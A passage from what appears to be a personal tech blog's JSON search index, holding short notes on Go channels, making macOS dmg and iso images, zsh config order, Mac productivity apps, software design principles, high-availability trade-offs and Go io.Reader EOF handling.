\u003ctr\u003e\n          \u003ctd style=\"text-align: center\"\u003e关闭\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e只读 channel\u003c/td\u003e\n          \u003ctd style=\"text-align: center\"\u003e编译错误\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":["URL","Go","channel"],"title":"channel 的 15 条规则和底层实现"},{"categories":["URL","MacOS","dmg","iso"],"contents":" 制作 macOS 系统 dmg 包及 iso 可引导镜像 dmg AppStore ==\u0026gt; search \u0026lsquo;install macos\u0026rsquo; ==\u0026gt; get installer ==\u0026gt; du -sh /Applications/Install\\ macOS\\ Mojave.app/ 磁碟工具程式 ==\u0026gt; 檔案 ==\u0026gt; 新增映像檔 ==\u0026gt; 空白映像檔 大小: installer size 格式: Mac OS 擴充格式(日誌式) 分割區: 單一分割區 - GUID 分割區配置表 映像檔格式: 可讀寫的磁碟映像檔 same as hdiutil create -o ~/Desktop/macOS\\ Mojave -size 6500m -layout SPUD -fs HFS+J sudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/macOS\\ Mojave iso hdiutil convert ~/Desktop/macOS\\ Mojave.dmg -format UDTO -o ~/Desktop/macOS\\ Mojave.iso mv ~/Desktop/macOS\\ Mojave.iso.cdr ~/Desktop/macOS\\ Mojave.iso ","date":"June 12, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230612-macos-dmg-iso/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.newlearner.site/2019/03/07/macos-dmg-iso.html\" target=\"_blank\" rel=\"noopener\"\u003e制作 macOS 系统 dmg 包及 iso 可引导镜像\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"dmg\"\u003edmg\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAppStore ==\u0026gt; search \u0026lsquo;install macos\u0026rsquo; ==\u0026gt; get installer ==\u0026gt; \u003ccode\u003edu -sh /Applications/Install\\ macOS\\ Mojave.app/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e磁碟工具程式 ==\u0026gt; 檔案 ==\u0026gt; 新增映像檔 ==\u0026gt; 空白映像檔\n\u003col\u003e\n\u003cli\u003e大小: installer size\u003c/li\u003e\n\u003cli\u003e格式: Mac OS 擴充格式(日誌式)\u003c/li\u003e\n\u003cli\u003e分割區: 單一分割區 - GUID 分割區配置表\u003c/li\u003e\n\u003cli\u003e映像檔格式: 可讀寫的磁碟映像檔\u003c/li\u003e\n\u003cli\u003esame as \u003ccode\u003ehdiutil create -o ~/Desktop/macOS\\ Mojave -size 6500m -layout SPUD -fs HFS+J\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/macOS\\ Mojave\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"iso\"\u003eiso\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003ehdiutil convert ~/Desktop/macOS\\ Mojave.dmg -format UDTO -o ~/Desktop/macOS\\ Mojave.iso\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emv ~/Desktop/macOS\\ Mojave.iso.cdr  ~/Desktop/macOS\\ Mojave.iso\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","MacOS","dmg","iso"],"title":"制作macOS系统dmg包及iso可引导镜像"},{"categories":["URL","Synology","NAS"],"contents":" Synology: Your NAS RAM Details at a Glance step1 Control Panel / Task Scheduler / Create / Scheduled Task / User-defined script\nstep2 General: In the Task field type in RAM Details. Uncheck the \u0026ldquo;Enabled\u0026rdquo; option. Select root User. Schedule: Select Run on the following date then select \u0026ldquo;Do not repeat\u0026rdquo;. Task Settings: Check \u0026ldquo;Send run details by email\u0026rdquo;, add your email then copy paste the code below in the Run command area. After that, click OK. ","date":"May 8, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230508-synology-your-nas-ram-details-at-a-glance/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mariushosting.com/synology-your-nas-ram-details-at-a-glance/\" target=\"_blank\" rel=\"noopener\"\u003eSynology: Your NAS RAM Details at a Glance\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"step1\"\u003estep1\u003c/h3\u003e\n\u003cp\u003eControl Panel / Task Scheduler / Create / Scheduled Task / User-defined script\u003c/p\u003e\n\u003ch3 id=\"step2\"\u003estep2\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eGeneral: In the Task field type in RAM Details. Uncheck the \u0026ldquo;Enabled\u0026rdquo; option. Select root User.\u003c/li\u003e\n\u003cli\u003eSchedule: Select Run on the following date then select \u0026ldquo;Do not repeat\u0026rdquo;.\u003c/li\u003e\n\u003cli\u003eTask Settings: Check \u0026ldquo;Send run details by email\u0026rdquo;, add your email then copy paste the code below in the Run command area. After that, click OK.\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Synology","NAS"],"title":"Synology: Your NAS RAM Details at a Glance"},{"categories":["URL","ZSH"],"contents":" zsh 配置文件解析及优先级 zsh 的环境变量配置文件有： .zprofile .zlogin .zshrc .zshenv .zlogout .zshrc 就是用来对 Shell 整体做个性化配置的\n.zprofile 和 .zlogin 差不多是一样的，他们都会被 login shells 设置环境变量，只是加载时间可能有一些差别。.zprofile 是基于 Bash 的 .bash_profile ，而 .zlogin 则是仿照 CSH 的 .login 遗留下来的名字 .zshrc 会设置 interactive shells 的环境变量。它会在 .zprofile 之后加载。通常可以设置 $PATH, $PROMPT, aliases, functions 等等。 .zshenv 总是会被读取，所以也可以在这里设置环境变量，$PATH 或 $EDITOR 等，但一般不怎么使用 zlogout 是在一个会话登出的时候被加载，非常适合用来清理临时的配置，比如重置终端窗口的标题 zsh 会在用户登录时(login shell)加载 ~/.zprofile\nzsh 会在开启新的终端会话时加载 ~/.zshrc\n需要注意的是首先会加载 /etc/zshenv 下的内容， 然后再加载 HOME 目录下的配置文件： .zshenv → [.zprofile if login] → [.zshrc if interactive] → [.zlogin if login] → [.zlogout].\n","date":"May 8, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230508-zprofile-zshrc/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://einverne.github.io/post/2023/01/zprofile-zshrc.html\" target=\"_blank\" rel=\"noopener\"\u003ezsh 配置文件解析及优先级\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"zsh-的环境变量配置文件有\"\u003ezsh 的环境变量配置文件有：\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e.zprofile\u003c/li\u003e\n\u003cli\u003e.zlogin\u003c/li\u003e\n\u003cli\u003e.zshrc\u003c/li\u003e\n\u003cli\u003e.zshenv\u003c/li\u003e\n\u003cli\u003e.zlogout\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e.zshrc 就是用来对 Shell 整体做个性化配置的\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e.zprofile 和 .zlogin 差不多是一样的，他们都会被 login shells 设置环境变量，只是加载时间可能有一些差别。.zprofile 是基于 Bash 的 .bash_profile ，而 .zlogin 则是仿照 CSH 的 .login 遗留下来的名字\u003c/li\u003e\n\u003cli\u003e.zshrc 会设置 interactive shells 的环境变量。它会在 .zprofile 之后加载。通常可以设置 $PATH, $PROMPT, aliases, functions 等等。\u003c/li\u003e\n\u003cli\u003e.zshenv 总是会被读取，所以也可以在这里设置环境变量，$PATH 或 $EDITOR 等，但一般不怎么使用\u003c/li\u003e\n\u003cli\u003ezlogout 是在一个会话登出的时候被加载，非常适合用来清理临时的配置，比如重置终端窗口的标题\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ezsh 会在用户登录时(login shell)加载 ~/.zprofile\u003c/p\u003e\n\u003cp\u003ezsh 会在开启新的终端会话时加载 ~/.zshrc\u003c/p\u003e\n\u003ch3 id=\"需要注意的是首先会加载-etczshenv-下的内容-然后再加载-home-目录下的配置文件\"\u003e需要注意的是首先会加载 /etc/zshenv 下的内容， 然后再加载 HOME 目录下的配置文件：\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e.zshenv → [.zprofile if login] → [.zshrc if interactive] → [.zlogin if login] → [.zlogout].\u003c/code\u003e\u003c/p\u003e","tags":["URL","ZSH"],"title":"zsh 配置文件解析及优先级"},{"categories":["URL","MacOS"],"contents":" 我的提升生產力 Mac 設定與軟體 控制個別 App 是否進入 dark mode https://nightowlapp.co/\nbrew install --cask nightowl\n用鍵盤控制外接螢幕亮度 - MonitorControl https://github.com/MonitorControl/MonitorControl\nbrew install --cask monitorcontrol\nRaycast Raycast 可以視為免費而且功能更強大的 Alfred，讓你不需要用滑鼠，靠鍵盤 Option + Space 快速啟用各種功能，內建許多付費 App 才有的功能\n快速啟動 App 快速查字典跟使用計算機 內建查找剪貼簿歷史紀錄 自帶像是 Magnet 得 window managment 功能，利用快捷鍵迅速調整視窗大小置左置右 與行事曆整合，會議時間快到可以用快捷鍵快速開啟 Google Meet 遠端會議，而且會帶入對的 email 帳戶 可以自行寫 shell nodejs applescript 綁定快捷鍵快速啟用。 豐富的 extenstion store 可以下載 https://www.raycast.com/\nbrew install --cask raycast\n減少風扇起飛 - 讓 Spotlight 排除你的專案資料夾 系統設定 \u0026gt; Spotlight \u0026gt; 搜尋隱私權\n","date":"April 20, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230420-my-mac-setting/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jason-memo.dev/posts/my-mac-setting/\" target=\"_blank\" rel=\"noopener\"\u003e我的提升生產力 Mac 設定與軟體\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"控制個別-app-是否進入-dark-mode\"\u003e控制個別 App 是否進入 dark mode\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://nightowlapp.co/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://nightowlapp.co/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003ebrew install --cask nightowl\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"用鍵盤控制外接螢幕亮度---monitorcontrol\"\u003e用鍵盤控制外接螢幕亮度 - MonitorControl\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/MonitorControl/MonitorControl\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/MonitorControl/MonitorControl\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003ebrew install --cask monitorcontrol\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"raycast\"\u003eRaycast\u003c/h3\u003e\n\u003cp\u003eRaycast 可以視為免費而且功能更強大的 Alfred，讓你不需要用滑鼠，靠鍵盤 Option + Space 快速啟用各種功能，內建許多付費 App 才有的功能\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e快速啟動 App\u003c/li\u003e\n\u003cli\u003e快速查字典跟使用計算機\u003c/li\u003e\n\u003cli\u003e內建查找剪貼簿歷史紀錄\u003c/li\u003e\n\u003cli\u003e自帶像是 Magnet 得 window managment 功能，利用快捷鍵迅速調整視窗大小置左置右\u003c/li\u003e\n\u003cli\u003e與行事曆整合，會議時間快到可以用快捷鍵快速開啟 Google Meet 遠端會議，而且會帶入對的 email 帳戶\u003c/li\u003e\n\u003cli\u003e可以自行寫 shell nodejs applescript 綁定快捷鍵快速啟用。\u003c/li\u003e\n\u003cli\u003e豐富的 extenstion store 可以下載\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.raycast.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.raycast.com/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\u003ccode\u003ebrew install --cask raycast\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"減少風扇起飛---讓-spotlight-排除你的專案資料夾\"\u003e減少風扇起飛 - 讓 Spotlight 排除你的專案資料夾\u003c/h3\u003e\n\u003cp\u003e系統設定 \u0026gt; Spotlight \u0026gt; 搜尋隱私權\u003c/p\u003e","tags":["URL","MacOS"],"title":"我的提升生產力 Mac 設定與軟體"},{"categories":["URL","software","design","principle"],"contents":" 一些软件设计的原则 1. Don\u0026rsquo;t Repeat Yourself (DRY) 2. Keep It Simple, Stupid (KISS) 把一个事情搞复杂是一件简单的事，但要把一个复杂的事变简单，这是一件复杂的事。\n3. Program to an interface, not an implementation 喜欢组合而不是继承 依赖倒置原则 4. Command-Query Separation (CQS) - 命令-查询分离原则 查询：当一个方法返回一个值来回应一个问题的时候，它就具有查询的性质； 命令：当一个方法要改变对象的状态的时候，它就具有命令的性质； 5. You Ain\u0026rsquo;t Gonna Need It (YAGNI) 只考虑和设计必须的功能，避免过度设计。只实现目前需要的功能，在以后您需要更多功能时，可以再进行添加。\n6. Law of Demeter - 迪米特法则 最少知识原则（Principle of Least Knowledge） 不要和陌生人说话\n如果你想让你的狗跑的话，你会对狗狗说还是对四条狗腿说？ 如果你去店里买东西，你会把钱交给店员，还是会把钱包交给店员让他自己拿？\n对于对象 O 中一个方法 M ，M 应该只能够访问以下对象中的方法：\n对象 O； 与 O 直接相关的 Component Object； 由方法 M 创建或者实例化的对象； 作为方法 M 的参数的对象。 7. 面向对象的 S.O.L.I.D 原则 Single Responsibility Principle (SRP) - 职责单一原则 一个类，只做一件事，并把这件事做好，其只有一个引起它变化的原因\nUnix/Linux 是这一原则的完美体现者。各个程序都独立负责一个单一的事。 Windows 是这一原则的反面示例。几乎所有的程序都交织耦合在一起。 Open/Closed Principle (OCP) - 开闭原则 模块是可扩展的，而不可修改的。也就是说，对扩展是开放的，而对修改是封闭的。\n对扩展开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。 对修改封闭，意味着类一旦设计完成，就可以独立完成其工作，而不要对类进行任何修改。 Liskov substitution principle (LSP) - 里氏代换原则 \u0026ldquo;Subtypes must be substitutable for their base types\u0026rdquo;。也就是，子类必须能够替换成它们的基类。即：子类应该可以替换任何基类能够出现的地方，并且经过替换以后，代码还能正常工作。\nInterface Segregation Principle (ISP) - 接口隔离原则 接口隔离原则意思是把功能实现在接口中，而不是类中，使用多个专门的接口比使用单一的总接口要好。\nDependency Inversion Principle (DIP) - 依赖倒置原则 高层模块不应该依赖于低层模块的实现，而是依赖于高层抽象。\n墙面的开关不应该依赖于电灯的开关实现，而是应该依赖于一个抽象的开关的标准接口，这样，当我们扩展程序的时候，我们的开关同样可以控制其它不同的灯，甚至不同的电器。 浏览器并不依赖于后面的 web 服务器，其只依赖于 HTTP 协议。 8. Common Closure Principle（CCP）- 共同封闭原则 一个包中所有的类应该对同一种类型的变化关闭。一个变化影响一个包，便影响了包中所有的类。一个更简短的说法是：一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。\n9. Common Reuse Principle (CRP) - 共同重用原则 包的所有类被一起重用。如果你重用了其中的一个类，就重用全部。换个说法是，没有被一起重用的类不应该被组合在一起。\n10. Hollywood Principle - 好莱坞原则 don\u0026rsquo;t call us, we\u0026rsquo;ll call you.\n就是由容器控制程序之间的关系，而非传统实现中，由程序代码直接操控。这也就是所谓\u0026quot;控制反转\u0026quot;的概念所在：\n不创建对象，而是描述创建对象的方式。 在代码中，对象与服务没有直接联系，而是容器负责将这些联系在一起。 控制权由应用代码中转到了外部容器，控制权的转移，是所谓反转。\n11. High Cohesion \u0026amp; Low/Loose coupling - 高内聚， 低耦合 内聚：一个模块内各个元素彼此结合的紧密程度 耦合：一个软件结构内不同模块之间互连程度的度量 12. Convention over Configuration（CoC）- 惯例优于配置原则 将一些公认的配置方式和信息作为内部缺省的规则来使用。\n13. Separation of Concerns (SoC) - 关注点分离 这个原则，就是在软件开发中，通过各种手段，将问题的各个关注点分开。如果一个问题能分解为独立且较小的问题，就是相对较易解决的。\n14. Design by Contract (DbC) - 契约式设计 15. Acyclic Dependencies Principle (ADP) - 无环依赖原则 ","date":"April 18, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230418-software-design-principles/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/4535.html\" target=\"_blank\" rel=\"noopener\"\u003e一些软件设计的原则\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"1-dont-repeat-yourself-dry\"\u003e1. Don\u0026rsquo;t Repeat Yourself (DRY)\u003c/h3\u003e\n\u003ch3 id=\"2-keep-it-simple-stupid-kiss\"\u003e2. Keep It Simple, Stupid (KISS)\u003c/h3\u003e\n\u003cp\u003e把一个事情搞复杂是一件简单的事，但要把一个复杂的事变简单，这是一件复杂的事。\u003c/p\u003e\n\u003ch3 id=\"3-program-to-an-interface-not-an-implementation\"\u003e3. Program to an interface, not an implementation\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e喜欢组合而不是继承\u003c/li\u003e\n\u003cli\u003e依赖倒置原则\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"4-command-query-separation-cqs---命令-查询分离原则\"\u003e4. Command-Query Separation (CQS) - 命令-查询分离原则\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e查询：当一个方法返回一个值来回应一个问题的时候，它就具有查询的性质；\u003c/li\u003e\n\u003cli\u003e命令：当一个方法要改变对象的状态的时候，它就具有命令的性质；\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"5-you-aint-gonna-need-it-yagni\"\u003e5. You Ain\u0026rsquo;t Gonna Need It (YAGNI)\u003c/h3\u003e\n\u003cp\u003e只考虑和设计必须的功能，避免过度设计。只实现目前需要的功能，在以后您需要更多功能时，可以再进行添加。\u003c/p\u003e\n\u003ch3 id=\"6-law-of-demeter---迪米特法则\"\u003e6. Law of Demeter - 迪米特法则\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e最少知识原则（Principle of Least Knowledge）\n不要和陌生人说话\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e如果你想让你的狗跑的话，你会对狗狗说还是对四条狗腿说？\n如果你去店里买东西，你会把钱交给店员，还是会把钱包交给店员让他自己拿？\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e对于对象 O 中一个方法 M ，M 应该只能够访问以下对象中的方法：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e对象 O；\u003c/li\u003e\n\u003cli\u003e与 O 直接相关的 Component Object；\u003c/li\u003e\n\u003cli\u003e由方法 M 创建或者实例化的对象；\u003c/li\u003e\n\u003cli\u003e作为方法 M 的参数的对象。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"7-面向对象的-solid-原则\"\u003e7. 面向对象的 S.O.L.I.D 原则\u003c/h3\u003e\n\u003ch4 id=\"single-responsibility-principle-srp---职责单一原则\"\u003eSingle Responsibility Principle (SRP) - 职责单一原则\u003c/h4\u003e\n\u003cp\u003e一个类，只做一件事，并把这件事做好，其只有一个引起它变化的原因\u003c/p\u003e","tags":["URL","software","design","principle"],"title":"一些软件设计的原则"},{"categories":["URL","design","system","HA"],"contents":" 关于高可用的系统 項目 / 機制 Backups M/S MM 2PC Paxos Consistency Weak Eventual Eventual Strong Strong Transactions No Full Local Full Full Latency Low Low Low High High Throughput High High High Low Medium Data loss Lots Some Some None None Failover Down Read only Read only Read/write Read/write 这个图基本上来说是目前高可用系统中能看得到的所有的解决方案的基础了。M/S、MM 实现起来不难，但是会有很多问题，2PC 的问题就是性能不行，而 Paxos 的问题就是太复杂，实现难度太大。\n总结一下各个高可用方案的的问题：\n对于最终一致性来说，在宕机的情况下，会出现数据没有完全同步完成，会出现数据差异性。 对于强一致性来说，要么使用性能比较慢的 XA 系的两阶段提交的方案，要么使用性能比较好，但是实现比较复杂的 Paxos 协议。 ","date":"April 18, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230418-high-availability-system/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/17459.html\" target=\"_blank\" rel=\"noopener\"\u003e关于高可用的系统\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e項目 / 機制\u003c/th\u003e\n          \u003cth\u003eBackups\u003c/th\u003e\n          \u003cth\u003eM/S\u003c/th\u003e\n          \u003cth\u003eMM\u003c/th\u003e\n          \u003cth\u003e2PC\u003c/th\u003e\n          \u003cth\u003ePaxos\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eConsistency\u003c/td\u003e\n          \u003ctd\u003eWeak\u003c/td\u003e\n          \u003ctd\u003eEventual\u003c/td\u003e\n          \u003ctd\u003eEventual\u003c/td\u003e\n          \u003ctd\u003eStrong\u003c/td\u003e\n          \u003ctd\u003eStrong\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eTransactions\u003c/td\u003e\n          \u003ctd\u003eNo\u003c/td\u003e\n          \u003ctd\u003eFull\u003c/td\u003e\n          \u003ctd\u003eLocal\u003c/td\u003e\n          \u003ctd\u003eFull\u003c/td\u003e\n          \u003ctd\u003eFull\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLatency\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eThroughput\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eHigh\u003c/td\u003e\n          \u003ctd\u003eLow\u003c/td\u003e\n          \u003ctd\u003eMedium\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eData loss\u003c/td\u003e\n          \u003ctd\u003eLots\u003c/td\u003e\n          \u003ctd\u003eSome\u003c/td\u003e\n          \u003ctd\u003eSome\u003c/td\u003e\n          \u003ctd\u003eNone\u003c/td\u003e\n          \u003ctd\u003eNone\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eFailover\u003c/td\u003e\n          \u003ctd\u003eDown\u003c/td\u003e\n          \u003ctd\u003eRead only\u003c/td\u003e\n          \u003ctd\u003eRead only\u003c/td\u003e\n          \u003ctd\u003eRead/write\u003c/td\u003e\n          \u003ctd\u003eRead/write\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e这个图基本上来说是目前高可用系统中能看得到的所有的解决方案的基础了。M/S、MM 实现起来不难，但是会有很多问题，2PC 的问题就是性能不行，而 Paxos 的问题就是太复杂，实现难度太大。\u003c/p\u003e\n\u003cp\u003e总结一下各个高可用方案的的问题：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e对于最终一致性来说，在宕机的情况下，会出现数据没有完全同步完成，会出现数据差异性。\u003c/li\u003e\n\u003cli\u003e对于强一致性来说，要么使用性能比较慢的 XA 系的两阶段提交的方案，要么使用性能比较好，但是实现比较复杂的 Paxos 协议。\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","design","system","HA"],"title":"关于高可用的系统"},{"categories":["URL","network","MTU","MSS","Linux"],"contents":" 有关 MTU 和 MSS 的一切 ","date":"April 12, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230412-all-about-mtu-and-mss/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.kawabangga.com/posts/4983\" target=\"_blank\" rel=\"noopener\"\u003e有关 MTU 和 MSS 的一切\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","network","MTU","MSS","Linux"],"title":"有关 MTU 和 MSS 的一切"},{"categories":["URL","Go"],"contents":" 使用 Go 语言解析二进制数据踩坑总结 for { buf := make([]byte, bufSize) n, err := r.Read(buf) if err == io.EOF { return } else if err != nil { aerr.Store(err) return } ch \u0026lt;- buf[:n] } 当 err 的值为 io.EOF 时直接返回了。这是最可能出问题的地方。仔细阅读函数文档发现：\nCallers should always process the n \u0026gt; 0 bytes returned before considering the error err. Doing so correctly handles I/O errors that happen after reading some bytes and also both of the allowed EOF behaviors.\n所以程序必须先处理 n \u0026gt; 0 的情况，然后再处理 err != nil 的情况！这跟我之前的印象不相符。因为一般来说，当 err 非空时，前面的返回数据一般都是空值。但 io.Reader 并不是这样。\n","date":"January 20, 2023","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2023/20230120-parse-binary-data/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tao.zz.ac/go/parse-binary-data.html\" target=\"_blank\" rel=\"noopener\"\u003e使用 Go 语言解析二进制数据踩坑总结\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebufSize\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRead\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eaerr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStore\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e[:\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003e当 err 的值为 io.EOF 时直接返回了。这是最可能出问题的地方。仔细阅读函数文档发现：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCallers should always process the n \u0026gt; 0 bytes returned before considering the error err. Doing so correctly handles I/O errors that happen after reading some bytes and also both of 